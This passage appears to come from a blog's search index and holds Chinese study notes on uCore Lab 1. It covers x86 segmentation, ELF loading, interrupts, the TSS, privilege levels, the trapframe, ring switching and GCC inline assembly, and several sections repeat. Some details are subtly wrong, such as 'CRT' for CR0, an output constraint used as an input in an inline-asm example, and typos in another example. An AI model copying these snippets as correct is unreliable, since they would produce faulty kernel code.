全局描述符表（GDT）我们需要一个大数组来管理那么多的段，这个数组我们称为全局描述符表（GDT），它保存了各段的段描述符，简称段表。 全局描述符表的起始地址保存在全局描述符表寄存器GDTR中。GDTR长48位，其中高32位为基地址，低16位为段界限。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:4:1","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#段描述符"},{"categories":["Pwning"],"content":"建立段映射各段寄存器指向了不同段的基址，而在每个段的开始有段描述符。 段描述符 在分段存储管理机制的保护模式下，每个段由如下三个参数进行定义：段基地址(Base Address)、段界限(Limit)和段属性(Attributes) 段基地址：规定线性地址空间中段的起始地址。任何一个段都可以从32位线性地址空间中的任何一个字节开始，不用像实模式下规定边界必须被16整除。 段界限：规定段的大小。可以以字节为单位或以4K字节为单位。 段属性：确定段的各种性质。 段属性中的粒度位（Granularity），用符号G标记。G=0表示段界限以字节位位单位，20位的界限可表示的范围是1字节至1M字节，增量为1字节；G=1表示段界限以4K字节为单位，于是20位的界限可表示的范围是4K字节至4G字节，增量为4K字节。 类型（TYPE）：用于区别不同类型的描述符。可表示所描述的段是代码段还是数据段，所描述的段是否可读/写/执行，段的扩展方向等。其4bit从左到右分别是 执行位：置1时表示可执行，置0时表示不可执行； 一致位：置1时表示一致码段，置0时表示非一致码段； 读写位：置1时表示可读可写，置0时表示只读； 访问位：置1时表示已访问，置0时表示未访问。 描述符特权级（Descriptor Privilege Level）（DPL）：用来实现保护机制。 段存在位（Segment-Present bit）：如果这一位为0，则此描述符为非法的，不能被用来实现地址转换。如果一个非法描述符被加载进一个段寄存器，处理器会立即产生异常。操作系统可以任意的使用被标识为可用（AVAILABLE）的位。 已访问位（Accessed bit）：当处理器访问该段（当一个指向该段描述符的选择子被加载进一个段寄存器）时，将自动设置访问位。操作系统可清除该位。 段选择子在一个段寄存器中，会保存一块区域叫段选择子。 线性地址部分的选择子是用来选择哪个描述符表和在该表中索引哪个描述符的。选择子可以做为指针变量的一部分，从而对应用程序员是可见的，但是一般是由连接加载器来设置的。 段选择子结构 索引（Index）：高13位，在描述符表中从8192个描述符中选择一个描述符。处理器自动将这个索引值乘以8（描述符的长度），再加上描述符表的基址来索引描述符表，从而选出一个合适的描述符。 表指示位（Table Indicator，TI）：1位，选择应该访问哪一个描述符表。0代表应该访问全局描述符表（GDT），1代表应该访问局部描述符表（LDT）。 请求特权级（Requested Privilege Level，RPL）：低两位，保护机制。 由段选择子得到的段描述符，再得到段的基址，最后加上偏移就得到了一个线性地址。在未开启分页机制时，线性地址即为物理地址。 全局描述符表（GDT）我们需要一个大数组来管理那么多的段，这个数组我们称为全局描述符表（GDT），它保存了各段的段描述符，简称段表。 全局描述符表的起始地址保存在全局描述符表寄存器GDTR中。GDTR长48位，其中高32位为基地址，低16位为段界限。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:4:1","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#段选择子"},{"categories":["Pwning"],"content":"建立段映射各段寄存器指向了不同段的基址，而在每个段的开始有段描述符。 段描述符 在分段存储管理机制的保护模式下，每个段由如下三个参数进行定义：段基地址(Base Address)、段界限(Limit)和段属性(Attributes) 段基地址：规定线性地址空间中段的起始地址。任何一个段都可以从32位线性地址空间中的任何一个字节开始，不用像实模式下规定边界必须被16整除。 段界限：规定段的大小。可以以字节为单位或以4K字节为单位。 段属性：确定段的各种性质。 段属性中的粒度位（Granularity），用符号G标记。G=0表示段界限以字节位位单位，20位的界限可表示的范围是1字节至1M字节，增量为1字节；G=1表示段界限以4K字节为单位，于是20位的界限可表示的范围是4K字节至4G字节，增量为4K字节。 类型（TYPE）：用于区别不同类型的描述符。可表示所描述的段是代码段还是数据段，所描述的段是否可读/写/执行，段的扩展方向等。其4bit从左到右分别是 执行位：置1时表示可执行，置0时表示不可执行； 一致位：置1时表示一致码段，置0时表示非一致码段； 读写位：置1时表示可读可写，置0时表示只读； 访问位：置1时表示已访问，置0时表示未访问。 描述符特权级（Descriptor Privilege Level）（DPL）：用来实现保护机制。 段存在位（Segment-Present bit）：如果这一位为0，则此描述符为非法的，不能被用来实现地址转换。如果一个非法描述符被加载进一个段寄存器，处理器会立即产生异常。操作系统可以任意的使用被标识为可用（AVAILABLE）的位。 已访问位（Accessed bit）：当处理器访问该段（当一个指向该段描述符的选择子被加载进一个段寄存器）时，将自动设置访问位。操作系统可清除该位。 段选择子在一个段寄存器中，会保存一块区域叫段选择子。 线性地址部分的选择子是用来选择哪个描述符表和在该表中索引哪个描述符的。选择子可以做为指针变量的一部分，从而对应用程序员是可见的，但是一般是由连接加载器来设置的。 段选择子结构 索引（Index）：高13位，在描述符表中从8192个描述符中选择一个描述符。处理器自动将这个索引值乘以8（描述符的长度），再加上描述符表的基址来索引描述符表，从而选出一个合适的描述符。 表指示位（Table Indicator，TI）：1位，选择应该访问哪一个描述符表。0代表应该访问全局描述符表（GDT），1代表应该访问局部描述符表（LDT）。 请求特权级（Requested Privilege Level，RPL）：低两位，保护机制。 由段选择子得到的段描述符，再得到段的基址，最后加上偏移就得到了一个线性地址。在未开启分页机制时，线性地址即为物理地址。 全局描述符表（GDT）我们需要一个大数组来管理那么多的段，这个数组我们称为全局描述符表（GDT），它保存了各段的段描述符，简称段表。 全局描述符表的起始地址保存在全局描述符表寄存器GDTR中。GDTR长48位，其中高32位为基地址，低16位为段界限。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:4:1","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#全局描述符表gdt"},{"categories":["Pwning"],"content":"保护模式使能建立映射后，使能保护模式。通过一个特定的寄存器，系统性寄存器CRT，将其bit 0置1，则代表CPU进入保护模式。段机制，是在保护模式下自动使能的。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:4:2","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#保护模式使能"},{"categories":["Pwning"],"content":"加载ELF格式的uCore kernel这里不是文件系统，因为我们还没有为kernel进行编写。 ELF文件格式概述ELF(Executable and linking format)文件格式是Linux系统下的一种常用目标文件(object file)格式，有三种主要类型: 用于执行的可执行文件(executable file)，用于提供程序的进程映像，加载的内存执行。 这也是本实验的OS文件类型。 用于连接的可重定位文件(relocatable file)，可与其它目标文件一起创建可执行文件和共享目标文件。 共享目标文件(shared object file)，连接器可将它与其它可重定位文件和共享目标文件连接成其它的目标文件，动态连接器又可将它与可执行文件和其它共享目标文件结合起来创建一个进程映像。 这里只分析与本实验相关的ELF可执行文件类型。ELF header在文件开始处描述了整个文件的组织。ELF的文件头包含整个执行文件的控制结构，其定义在elf.h中： struct elfhdr { uint magic; // must equal ELF_MAGIC uchar elf[12]; ushort type; ushort machine; uint version; uint entry; // 程序入口的虚拟地址 uint phoff; // program header 表的位置偏移 uint shoff; uint flags; ushort ehsize; ushort phentsize; ushort phnum; //program header表中的入口数目 ushort shentsize; ushort shnum; ushort shstrndx; }; program header描述与程序执行直接相关的目标文件结构信息，用来在文件中定位各个段的映像，同时包含其他一些用来为程序创建进程映像所必需的信息。 可执行文件的程序头部是一个program header结构的数组， 每个结构描述了一个段或者系统准备程序执行所必需的其它信息。目标文件的 “段” 包含一个或者多个 “节区”（section） ，也就是“段内容（Segment Contents）” 。程序头部仅对于可执行文件和共享目标文件有意义。可执行目标文件在ELF头部的e_phentsize和e_phnum成员中给出其自身程序头部的大小。程序头部的数据结构如下表所示： struct proghdr { uint type; // 段类型 uint offset; // 段相对文件头的偏移值 uint va; // 段的第一个字节将被放到内存中的虚拟地址 uint pa; uint filesz; uint memsz; // 段在内存映像中占用的字节数 uint flags; uint align; }; 根据elfhdr和proghdr的结构描述，bootloader就可以完成对ELF格式的ucore操作系统的加载过程（参见boot/bootmain.c中的bootmain函数）。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:5:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#加载elf格式的ucore-kernel"},{"categories":["Pwning"],"content":"加载ELF格式的uCore kernel这里不是文件系统，因为我们还没有为kernel进行编写。 ELF文件格式概述ELF(Executable and linking format)文件格式是Linux系统下的一种常用目标文件(object file)格式，有三种主要类型: 用于执行的可执行文件(executable file)，用于提供程序的进程映像，加载的内存执行。 这也是本实验的OS文件类型。 用于连接的可重定位文件(relocatable file)，可与其它目标文件一起创建可执行文件和共享目标文件。 共享目标文件(shared object file)，连接器可将它与其它可重定位文件和共享目标文件连接成其它的目标文件，动态连接器又可将它与可执行文件和其它共享目标文件结合起来创建一个进程映像。 这里只分析与本实验相关的ELF可执行文件类型。ELF header在文件开始处描述了整个文件的组织。ELF的文件头包含整个执行文件的控制结构，其定义在elf.h中： struct elfhdr { uint magic; // must equal ELF_MAGIC uchar elf[12]; ushort type; ushort machine; uint version; uint entry; // 程序入口的虚拟地址 uint phoff; // program header 表的位置偏移 uint shoff; uint flags; ushort ehsize; ushort phentsize; ushort phnum; //program header表中的入口数目 ushort shentsize; ushort shnum; ushort shstrndx; }; program header描述与程序执行直接相关的目标文件结构信息，用来在文件中定位各个段的映像，同时包含其他一些用来为程序创建进程映像所必需的信息。 可执行文件的程序头部是一个program header结构的数组， 每个结构描述了一个段或者系统准备程序执行所必需的其它信息。目标文件的 “段” 包含一个或者多个 “节区”（section） ，也就是“段内容（Segment Contents）” 。程序头部仅对于可执行文件和共享目标文件有意义。可执行目标文件在ELF头部的e_phentsize和e_phnum成员中给出其自身程序头部的大小。程序头部的数据结构如下表所示： struct proghdr { uint type; // 段类型 uint offset; // 段相对文件头的偏移值 uint va; // 段的第一个字节将被放到内存中的虚拟地址 uint pa; uint filesz; uint memsz; // 段在内存映像中占用的字节数 uint flags; uint align; }; 根据elfhdr和proghdr的结构描述，bootloader就可以完成对ELF格式的ucore操作系统的加载过程（参见boot/bootmain.c中的bootmain函数）。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:5:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#elf文件格式概述"},{"categories":["Pwning"],"content":"中断、异常和系统调用为什么需要中断、异常和系统调用？ 在计算机运行中，内核是被信任的第三方 只有内核可以执行特权指令 方便应用程序 中断和异常希望解决，外设连接计算机时的加载问题和应对程序的意外行为。如，当计算机希望你按回车键时，按下键盘的时间是不确定的，计算机不能永远等待。 系统调用希望解决用户使用内核服务时，不会对内核造成威胁的问题。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#中断异常和系统调用"},{"categories":["Pwning"],"content":"中断","date":"2021-07-10","objectID":"/ucore-lab-1/:1:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#中断"},{"categories":["Pwning"],"content":"BIOS中断、DOS中断、Linux中断的区别 BIOS和DOS都存在于实模式下，由它们建立的中断调用都是建立在中断向量表（Interrupt Vector Table，IVT）中的，都是通过软中断指令 int 中断号来调用。 BIOS 中断调用的主要功能是提供了硬件访问的方法，该方法使对硬件的操作变得简单易行。 DOS 是运行在实模式下的，故其建立的中断调用也建立在中断向量表中，只不过其中断向量号和BIOS的不能冲突。 Linux 内核是在进入保护模式后才建立中断例程的，不过在保护模式下，中断向量表已经不存在了，取而代之的是中断描述符表（Interrupt Descriptor Table，IDT）。Linux 的系统调用和DOS中断调用类似，不过Linux是通过int 0x80指令进入一个中断程序后再根据eax寄存器的值来调用不同的子功能函数的。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:1","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#bios中断dos中断linux中断的区别"},{"categories":["Pwning"],"content":"中断描述符表 中断描述符表（Interrupt Descriptor Table, IDT）把每个中断或异常编号和一个指向中断服务例程的描述符联系起来。同GDT一样，IDT是一个8字节的描述符数组，但IDT的第一项可以包含一个描述符。 IDT可以位于内存的任意位置，CPU通过IDT寄存器（IDTR）的内容来寻址IDT的起始地址。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:2","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#中断描述符表"},{"categories":["Pwning"],"content":"IDT gate descriptors 中断/异常应该使用Interrupt Gate或Trap Gate。其中的唯一区别就是：当调用Interrupt Gate时，Interrupt会被CPU自动禁止；而调用Trap Gate时，CPU则不会去禁止或打开中断，而是保留原样。 这其中的原理是当CPU跳转至Interrupt Gate时，其eflag上的IF位会被清除。而Trap Gate则不改变。 IDT中包含了3种类型的Descriptor Task-gate descriptor Interrupt-gate descriptor （中断方式用到） Trap-gate descriptor（系统调用用到） ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:3","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#idt-gate-descriptors"},{"categories":["Pwning"],"content":"中断的处理流程 产生中断后，会通过其中断号，查找其ISR在IDT的哪一项。 找到响应的Interrupt Gate或Trap Gate，取出段选择子 根据段选择子查找GDT，得到基地址 基地址+偏移得到中断服务例程的地址。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:4","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#中断的处理流程"},{"categories":["Pwning"],"content":"不同特权级的中断切换对堆栈的影响堆栈的不同特权级记录在段描述符中。如果低两位为0，则运行为内核态，若为3，则运行在用户态。 在用户态产生的中断会进入内核态进行处理，而在内核态产生的中断还是在内核态。这是两种不同的处理方式，因为其中产生了特权级的变化。 内核态中断 栈没有变换 如果产生的是异常，压入Error code 压入cs和eip，即压入pc值 压入标志寄存器的值 通过iret返回，会弹出EFLAGS和SS/EIP（根据是否改变特权级） 用户态中断 切换到内核堆栈 在内核中断的基础上额外压入用户栈的ss和esp，保存用户态的栈信息 通过ret或retf返回，仅弹出EIP，retf弹出CS和EIP ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:5","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#不同特权级的中断切换对堆栈的影响"},{"categories":["Pwning"],"content":"不同特权级的中断切换对堆栈的影响堆栈的不同特权级记录在段描述符中。如果低两位为0，则运行为内核态，若为3，则运行在用户态。 在用户态产生的中断会进入内核态进行处理，而在内核态产生的中断还是在内核态。这是两种不同的处理方式，因为其中产生了特权级的变化。 内核态中断 栈没有变换 如果产生的是异常，压入Error code 压入cs和eip，即压入pc值 压入标志寄存器的值 通过iret返回，会弹出EFLAGS和SS/EIP（根据是否改变特权级） 用户态中断 切换到内核堆栈 在内核中断的基础上额外压入用户栈的ss和esp，保存用户态的栈信息 通过ret或retf返回，仅弹出EIP，retf弹出CS和EIP ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:5","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#内核态中断"},{"categories":["Pwning"],"content":"不同特权级的中断切换对堆栈的影响堆栈的不同特权级记录在段描述符中。如果低两位为0，则运行为内核态，若为3，则运行在用户态。 在用户态产生的中断会进入内核态进行处理，而在内核态产生的中断还是在内核态。这是两种不同的处理方式，因为其中产生了特权级的变化。 内核态中断 栈没有变换 如果产生的是异常，压入Error code 压入cs和eip，即压入pc值 压入标志寄存器的值 通过iret返回，会弹出EFLAGS和SS/EIP（根据是否改变特权级） 用户态中断 切换到内核堆栈 在内核中断的基础上额外压入用户栈的ss和esp，保存用户态的栈信息 通过ret或retf返回，仅弹出EIP，retf弹出CS和EIP ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:5","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#用户态中断"},{"categories":["Pwning"],"content":"异常一般源于程序的错误执行，或非法访问。 异常处理的例程也多数只会中止程序的执行。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:2:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#异常"},{"categories":["Pwning"],"content":"系统调用系统调用也是特殊的中断，通过Trap Gate进入，所以通过系统调用进入内核态也称为陷入内核。 一个例子：在调用printf时，会触发系统调用write。 操作系统的服务的编程接口 通常由高级语言编写（C/C++） 通常通过更高层次的API封装而不是直接调用 ","date":"2021-07-10","objectID":"/ucore-lab-1/:3:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#系统调用"},{"categories":["Pwning"],"content":"实现 每个系统调用对应一个系统调用号 系统调用接口根据系统调用号来维护表的索引 系统调用接口调用内核态中的系统调用功能实现，并返回系统调用的状态和结果 用户不需要知道，系统调用的实现，只需设置参数获取返回结果。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:3:1","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#实现"},{"categories":["Pwning"],"content":"系统调用与函数调用 系统调用：使用int和iret，有堆栈切换和特权级的切换（内核堆栈和用户堆栈不同） 函数调用：使用call和ret，没有堆栈和特权级的切换 ","date":"2021-07-10","objectID":"/ucore-lab-1/:3:2","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#系统调用与函数调用"},{"categories":["Pwning"],"content":"系统调用开销： 超过函数调用 引导机制，用户到内核 建立内核堆栈 验证参数 内核态映射到用户态的地址空间，更新页面映射权限 内核独立地址空间，TLB变化 ","date":"2021-07-10","objectID":"/ucore-lab-1/:3:3","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#系统调用开销"},{"categories":["Pwning"],"content":"特权级特权级共分为四档，分别为0-3，其中Kernel为第0特权级（ring 0），用户程序为第3特权级（ring 3），系统程序分别为第1和第2特权级。 特权级的区别 一些指令（例如特权指令lgdt）只能运行在ring 0下。 CPU在如下时刻会检查特权级 访问数据段 访问页 进入中断服务例程（ISRs） … 如果检查失败，则会产生保护异常（General Protection Fault） ","date":"2021-07-10","objectID":"/ucore-lab-1/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#特权级"},{"categories":["Pwning"],"content":"TSS简介TSS，即 Task State Segment，意为任务状态段，TSS 是一种数据结构，它用于存储任务的环境。TSS 是每个任务都有的结构，它用于一个任务的标识，相当于任务的身份证，程序拥有此结构才能运行，这是处理器硬件上用于任务管理的系统结构，处理器能够识别其中每一个字段。 其中包含了三个栈指针，分别为ring0、ring1、ring2的特权栈。当低特权级向高特权级转换的时候，才会用到这些栈指针进行栈的切换。切换完成后，低特权级的栈指针会被保存在切换后的栈中，通过retf或iret返回。并不是每个任务都有三个栈指针，因为这些栈指针只有低特权级向高特权级转移时才会用到，所以对于本身就处在ring2的程序是没有ring2的栈指针的，其他同理。切换栈的操作从开始中断的那一瞬间就已完成。 TSS 是硬件支持的系统数据结构，它和GDT 等一样，由软件填写其内容，由硬件使用。GDT 也要加载到寄存器 GDTR 中才能被处理器找到，TSS也是一样，它是由 TR（Task Register）寄存器加载的，每次处理器执行不同任务时，将TR寄存器加载不同任务的TSS就成了。 Code:mmu.h /* task state segment format (as described by the Pentium architecture book) */ struct taskstate { uint32_t ts_link; // old ts selector uintptr_t ts_esp0; // stack pointers and segment selectors uint16_t ts_ss0; // after an increase in privilege level uint16_t ts_padding1; uintptr_t ts_esp1; uint16_t ts_ss1; uint16_t ts_padding2; uintptr_t ts_esp2; uint16_t ts_ss2; uint16_t ts_padding3; uintptr_t ts_cr3; // page directory base uintptr_t ts_eip; // saved state from last task switch uint32_t ts_eflags; uint32_t ts_eax; // more saved state (registers) uint32_t ts_ecx; uint32_t ts_edx; uint32_t ts_ebx; uintptr_t ts_esp; uintptr_t ts_ebp; uint32_t ts_esi; uint32_t ts_edi; uint16_t ts_es; // even more saved state (segment selectors) uint16_t ts_padding4; uint16_t ts_cs; uint16_t ts_padding5; uint16_t ts_ss; uint16_t ts_padding6; uint16_t ts_ds; uint16_t ts_padding7; uint16_t ts_fs; uint16_t ts_padding8; uint16_t ts_gs; uint16_t ts_padding9; uint16_t ts_ldt; uint16_t ts_padding10; uint16_t ts_t; // trap on task switch uint16_t ts_iomb; // i/o map base address }; ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#tss简介"},{"categories":["Pwning"],"content":"DPL、RPL、CPL、IOPL首先要明确一点，在计算机中具备“能动性”的只有计算机指令，只有指令才具备访问、请求其他资源的能力，指令便是资源的请求者。指令“请求”、“访问”其他资源的能力等级便称之为请求特 权级，指令存放在代码段中，所以，就用代码段寄存器 CS 中选择子的 RPL 位表示代码请求别人资源能力的等级。 DPL，即 Descriptor Privilege Level，描述符特权级，它存在于段描述符中。标识了访问该段的门槛。 CPL，Current Privilege Level，它表示处理器正在执行的代码的特权级别。它与当前段的DPL是相同的。 RPL，请求特权级，来自发出请求的CS.RPL。 IOPL，该位存在于eflags字段中。指当前运行任务的I/O特权级(I/O privilege level)，正在运行任务的当前特权级(CPL)必须小于或等于I/O特权级才能允许访问I/O地址空间。这个域只能在CPL为0时才能通过POPF以及IRET指令修改。 对于受访者为数据段（段描述符中 type 字段中未有X可执行属性）来说： 只有访问者的权限大于等于该 DPL 表示的最低权限才能够继续访问，否则连这个门槛都迈不过去。比如，DPL 为 1 的段描述符，只有特权级为 0、1 的访问者才有资格访问它所代表的资源，特权为 2、3 的访问者会被 CPU 拒之门外。 对于受访者为代码段（段描述符中 type 字段中含有X可执行属性）来说： 只有访问者的权限等于该 DPL 表示的最低权限才能够继续访问，即只能平级访问。任何权限大于或小于它的访问者都将被 CPU 拒之门外。这是为什么呢？自问自答之前先明确一个概念，对于受访者为代码段一这说法，实际上是指处理器从当前运行的代码段上转移到受访者这个目标代码段上去执行，并不是 说把该目标代码段当数据一样访问，在真实物理机器上，代码段通常情况下是不被当成数据来处理的，但确实可以这么做（话说虚拟机中会把代码当成数据来处理）。 对于数据段和代码段的要求不同，在执行代码时，高特权级的程序几乎不会主动降低自己的特权级，中断的返回除外。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:2:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#dplrplcpliopl"},{"categories":["Pwning"],"content":"trapFrame trapframe结构是进入中断门所必须的结构，其结构如下 COPYstruct trapframe { // tf_regs保存了基本寄存器的值，包括eax,ebx,esi,edi寄存器等等 struct pushregs tf_regs; uint16_t tf_gs; uint16_t tf_padding0; uint16_t tf_fs; uint16_t tf_padding1; uint16_t tf_es; uint16_t tf_padding2; uint16_t tf_ds; uint16_t tf_padding3; uint32_t tf_trapno; // 以下这些信息会被CPU硬件自动压入切换后的栈。包括下面切换特权级所使用的esp、ss等数据 uint32_t tf_err; uintptr_t tf_eip; uint16_t tf_cs; uint16_t tf_padding4; uint32_t tf_eflags; // 以下这些信息会在切换特权级时被使用 uintptr_t tf_esp; uint16_t tf_ss; uint16_t tf_padding5; } __attribute__((packed)); ","date":"2021-07-10","objectID":"/ucore-lab-1/:3:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#trapframe"},{"categories":["Pwning"],"content":"中断处理例程的入口代码 中断处理例程的入口代码用于保存上下文并构建一个trapframe，其源代码如下： COPY #include \u003cmemlayout.h\u003e # vectors.S sends all traps here. .text .globl __alltraps __alltraps: # push registers to build a trap frame # therefore make the stack look like a struct trapframe pushl %ds pushl %es pushl %fs pushl %gs pushal # load GD_KDATA into %ds and %es to set up data segments for kernel movl $GD_KDATA, %eax movw %ax, %ds movw %ax, %es # push %esp to pass a pointer to the trapframe as an argument to trap() pushl %esp # call trap(tf), where tf=%esp call trap # pop the pushed stack pointer popl %esp # return falls through to trapret... .globl __trapret __trapret: # restore registers from stack popal # restore %ds, %es, %fs and %gs popl %gs popl %fs popl %es popl %ds # get rid of the trap number and error code addl $0x8, %esp iret ","date":"2021-07-10","objectID":"/ucore-lab-1/:4:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#中断处理例程的入口代码"},{"categories":["Pwning"],"content":"切换特权级的过程","date":"2021-07-10","objectID":"/ucore-lab-1/:5:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#切换特权级的过程"},{"categories":["Pwning"],"content":"特权级提升当通过陷入门从ring3切换至ring0（特权提升） 时 在陷入的一瞬间，CPU会因为特权级的改变，索引TSS，切换ss和esp为内核栈，并按顺序自动压入user_ss、user_esp、user_eflags、user_cs、old_eip以及err。 需要注意的是，CPU先切换到内核栈，此时的esp与ss不再指向用户栈。但此时CPU却可以再将用户栈地址存入内核栈。这种操作可能是依赖硬件来完成的。 如果没有err，则CPU会自动压入0。 之后CPU会在中断处理例程入口处，先将剩余的段寄存器以及所有的通用寄存器压栈，构成一个trapframe。然后将该trapframe传入给真正的中断处理例程并执行。 该处理例程会判断传入的中断数(trapno)并执行特定的代码。在提升特权级的代码中，程序会处理传入的trapframe信息中的CS、DS、eflags寄存器，修改上面的DPL、CPL与IOPL以达到提升特权的目的。 将修改后的trapframe压入用户栈（这一步没有修改user_esp寄存器），并设置中断处理例程结束后将要弹出esp寄存器的值为用户栈的新地址（与刚刚不同，这一步修改了将要恢复的user_esp寄存器）。 注意此时的用户栈地址指向的是修改后的trapframe。 这样在退出中断处理程序，准备恢复上下文的时候，首先弹出的栈寄存器值是修改后的用户栈地址，其次弹出的通用寄存器、段寄存器等等都是存储于用户栈中的trapframe。 为什么要做这么奇怪的操作呢？ 因为恢复esp寄存器的指令只有一条pop %esp (当前环境下的iret指令不会弹出栈地址)。 正常情况下，中断处理例程结束，恢复esp寄存器后，esp指向的还是内核栈。 但我们的目的是切换回用户栈，则此时只能修改原先要恢复的esp值，通过该指令切换到用户栈。 思考一下，进入中断处理程序前，上下文保存在内核栈。但将要恢复回上下文的数据却存储于用户栈。 在内核中，将修改后的``trapframe压入用户栈这一步，需要舍弃trapframe中末尾两个旧的ss和esp寄存器数据，因为iret`指令的特殊性： iret指令的功能如下 iret指令会按顺序依次弹出eip、cs以及eflag的值到特定寄存器中，然后从新的cs:ip处开始执行。如果特权级发生改变，则还会在弹出eflag后再依次弹出esp与ss寄存器值。 由于iret前后特权级不发生改变（[中断中]ring0 -\u003e ring0 [中断后]），故iret指令不会弹出esp和ss寄存器值。如果这两个寄存器也被复制进用户栈，则相比于进入中断前的用户栈地址，esp最终会抬高8个字节，可能造成很严重的错误。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:5:1","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#特权级提升"},{"categories":["Pwning"],"content":"特权级降低通过陷入门从ring0切换至ring3（特权降低） 的过程与特权提升的操作基本一样，不过有几个不同点需要注意一下 与ring3调用中断不同，当ring0调用中断时，进入中断前和进入中断后的这个过程，栈不发生改变。 因为在调用中断前的权限已经处于ring0了，而中断处理程序里的权限也是ring0，所以这一步陷入操作的特权级没有发生改变，故不需要访问TSS并重新设置ss 、esp寄存器。 修改后的trapFrame不需要像上面那样保存至将要使用的栈，因为当前环境下iret前后特权级会发生改变，执行该命令会弹出ss和esp，所以可以通过iret来设置返回时的栈地址。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:5:2","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#特权级降低"},{"categories":["Pwning"],"content":"C函数调用的实现 C 语言函数调用栈 (一) C 语言函数调用栈 (二) ","date":"2021-07-10","objectID":"/ucore-lab-1/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#c函数调用的实现"},{"categories":["Pwning"],"content":"GCC内联汇编在c语言中插入汇编代码，完成c语言无法做到的指令。 ","date":"2021-07-10","objectID":"/ucore-lab-1/:0:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#gcc内联汇编"},{"categories":["Pwning"],"content":"Syntax asm(assembler template :output operands (optional) :input operands (optional) :clobbers (optional) ); ","date":"2021-07-10","objectID":"/ucore-lab-1/:1:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#syntax"},{"categories":["Pwning"],"content":"Example 1对于： movl $0xffff, %eax 转化为： asm(\"movl $0xffff, %%eax\\n\"); ","date":"2021-07-10","objectID":"/ucore-lab-1/:2:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#example-1"},{"categories":["Pwning"],"content":"Example 2对于： movl %cr0, %ebx movl %ebx, 12(%esp) orl $-2147483648, 12(%esp) movl 12(%esp), %eax movl %eax, %cr0 转化为： uint32_t cr0; asm volatile (\"movl %%cr0, %0\\n\": \"=r\"(cr0)); cr0 |= 0x80000000; asm volatile (\"movl %0, %%cr0\\n\":: \"=r\"(cr0)); volatile：不需要优化，不需要调整顺序 %0：第一个用到的寄存器 r：任意寄存器 ","date":"2021-07-10","objectID":"/ucore-lab-1/:3:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#example-2"},{"categories":["Pwning"],"content":"Example 3对于： movl $11, %eax movl -28(%ebp), %ebx movl -24(%ebp), %ecx movl -20(%ebp), %edx movl -16(%ebp), %esi int $0x80 movl %edi, -12(%ebp) 转化为： long_res, arg1 = 2, arg2 = 22, arg3 = 222, arg4 = 233; _asm_volatile(\"int $0x80\" :\"=a\"(_res) :\"0\"(11), \"b\"(arg1), \"c\"(arg2), \"d\"(arg3), \"S\"(arg4)); a = %eax b = %ebx c = %ecx d = %edx S = %esi D = %edi ","date":"2021-07-10","objectID":"/ucore-lab-1/:4:0","series":null,"tags":["Pwn"],"title":"UCore Lab 1","uri":"/ucore-lab-1/#example-3"},{"categories":["Pwning"],"content":"Lab 